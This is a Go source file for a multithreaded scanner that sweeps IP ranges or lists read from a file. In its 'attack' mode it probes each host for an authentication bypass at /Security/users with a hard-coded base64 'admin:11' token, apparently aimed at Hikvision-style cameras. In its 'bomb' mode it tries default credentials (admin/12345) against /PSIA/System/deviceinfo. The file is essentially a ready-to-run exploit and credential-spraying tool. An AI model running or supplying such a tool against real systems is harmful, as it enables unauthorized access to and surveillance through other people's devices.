package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gookit/color"
	"github.com/msterzhang/gpool"
)

var max int

type Flag struct {
	Ips      string // ip列表
	Ssl      string // 协议
	File     string // 文件
	Attack   bool   // POC
	Bomb     bool
	Username string
	Password string
	Threads  int
}

func Init() *Flag {
	portscan_flag := Flag{}
	flag.StringVar(&portscan_flag.Ips, "i", "", "输入ip地址 eg:192.0.0.1-192.0.0.255")
	flag.StringVar(&portscan_flag.Ssl, "s", "http", "协议 eg:http")
	flag.IntVar(&portscan_flag.Threads, "t", 50, "线程数量 默认50")
	flag.StringVar(&portscan_flag.File, "f", "", "文件名称 默认为空")
	flag.BoolVar(&portscan_flag.Attack, "a", false, "加载攻击模块")
	flag.BoolVar(&portscan_flag.Bomb, "b", false, "加载密码爆破模块")
	flag.StringVar(&portscan_flag.Username, "u", "admin", "用户名 default:admin")
	flag.StringVar(&portscan_flag.Password, "p", "12345", "密码 default:12345")
	return &portscan_flag
}

func StringIpToInt(ipstring string) int {
	ipSegs := strings.Split(ipstring, ".")
	var ipInt int = 0
	var pos uint = 24
	for _, ipSeg := range ipSegs {
		tempInt, _ := strconv.Atoi(ipSeg)
		tempInt = tempInt << pos
		ipInt = ipInt | tempInt
		pos -= 8
	}
	return ipInt
}

func IpIntToString(ipInt int) string {
	ipSegs := make([]string, 4)
	var len int = len(ipSegs)
	buffer := bytes.NewBufferString("")
	for i := 0; i < len; i++ {
		tempInt := ipInt & 0xFF
		ipSegs[len-i-1] = strconv.Itoa(tempInt)
		ipInt = ipInt >> 8
	}
	for i := 0; i < len; i++ {
		buffer.WriteString(ipSegs[i])
		if i < len-1 {
			buffer.WriteString(".")
		}
	}
	return buffer.String()
}

func checkips(ipstr string) (int, int) {
	ips_arr := strings.Split(ipstr, "-")
	if len(ips_arr) < 2 {
		return StringIpToInt(ips_arr[0]), StringIpToInt(ips_arr[0])
	}
	return StringIpToInt(ips_arr[0]), StringIpToInt(ips_arr[1])
}

func poc(ipstr int, ssl string, pool *gpool.Pool) int {
	client := &http.Client{Timeout: time.Duration(5 * time.Second)}
	req, err := http.NewRequest("GET", ssl+"://"+IpIntToString(ipstr)+"/Security/users?auth=YWRtaW46MTEK", nil)
	if err != nil {
		pool.Done()
		return 0
	}
	resp, err := client.Do(req)
	if err != nil {
		pool.Done()
		return 0
	}
	if resp.StatusCode == 200 {
		color.Red.Println("[Vul] verify " + IpIntToString(ipstr))
		pool.Done()
		return 1
	}
	pool.Done()
	return 0
}

func bomb(ipstr int, ssl string, username string, password string, pool *gpool.Pool) int {
	client := &http.Client{Timeout: time.Duration(5 * time.Second)}
	req, err := http.NewRequest("GET", ssl+"://"+IpIntToString(ipstr)+"/PSIA/System/deviceinfo", nil)
	if err != nil {
		pool.Done()
		return 0
	}
	req.SetBasicAuth(username, password)
	resp, err := client.Do(req)
	if err != nil {
		pool.Done()
		return 0
	}
	//resp, err := http.Get("http://" + IpIntToString(ipstr) + "/PSIA/System/deviceinfo"
	if resp.StatusCode == 200 {
		color.Red.Println("[Vul] verify " + IpIntToString(ipstr))
		pool.Done()
		return 1
	}
	pool.Done()
	return 0
}

func main() {
	portscan_flag := &Flag{}
	portscan_flag = Init()
	flag.Parse()
	color.Green.Println("[Load]加载线程数量" + strconv.Itoa(portscan_flag.Threads))
	pool := gpool.New(portscan_flag.Threads)
	if portscan_flag.Ips != "" && portscan_flag.File == "" {
		startip, endip := checkips(string(portscan_flag.Ips))
		if portscan_flag.Attack == portscan_flag.Bomb {
			color.Red.Println("[Error]不要同时使用a与b参数或者缺少任意参数")
			return
		}
		if portscan_flag.Attack {
			for i := startip; i <= endip; i++ {
				pool.Add(1)
				go poc(i, portscan_flag.Ssl, pool)
			}
			pool.Wait()
		}
		if portscan_flag.Bomb {
			for i := startip; i <= endip; i++ {
				pool.Add(1)
				go bomb(i, portscan_flag.Ssl, portscan_flag.Username, portscan_flag.Password, pool)
			}
			pool.Wait()
		}
	} else {
		fi, err := os.Open(portscan_flag.File)
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			return
		}
		defer fi.Close()
		br := bufio.NewReader(fi)
		for {
			ip, _, err := br.ReadLine()
			if err == io.EOF {
				break
			}
			startip, endip := checkips(string(ip))
			if portscan_flag.Attack == portscan_flag.Bomb {
				color.Red.Println("[Error]不要同时使用a与b参数或者缺少任意参数")
				return
			}
			if portscan_flag.Attack {
				for i := startip; i <= endip; i++ {
					pool.Add(1)
					go poc(i, portscan_flag.Ssl, pool)
				}
				pool.Wait()
			}
			if portscan_flag.Bomb {
				for i := startip; i <= endip; i++ {
					pool.Add(1)
					go bomb(i, portscan_flag.Ssl, portscan_flag.Username, portscan_flag.Password, pool)
				}
				pool.Wait()
			}

		}
	}
	color.Green.Println("[Success]Attack down")
}
